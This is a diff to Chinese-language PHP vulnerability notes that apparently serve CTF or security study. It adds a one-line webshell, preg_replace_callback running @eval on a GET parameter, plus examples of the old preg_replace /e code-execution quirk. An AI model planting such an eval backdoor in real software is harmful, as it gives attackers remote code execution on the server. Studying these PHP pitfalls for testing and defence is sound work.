@@ -1,5 +1,40 @@
 # php漏洞
 
+## 函数利用
+
+### preg_replace_callback
+
+```php
+<?php
+preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
+?>
+```
+
+
+
+利用条件:php版本=7
+
+### preg_replace()
+
+preg_replace漏洞触发有两个前提：
+
+1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令
+
+2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：
+
+3. php版本<7
+
+4. ```php
+   echo preg_replace('/test/e', 'phpinfo()', 'just test');
+   //这样是可以执行命令的
+   
+   echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
+   echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
+   //这两种没有匹配上，所以返回值是第三个参数，不能执行命令
+   ```
+
+
+
 ## 函数绕过
 
 ### strcmp
@@ -38,6 +73,6 @@
 
 ## 杂
 
-### '0xaa'可以被理解为数字
+### '0xaa'可以被理解为数字(php7之前的版本)
 所以'0xccccccccc'='54975581388'
 
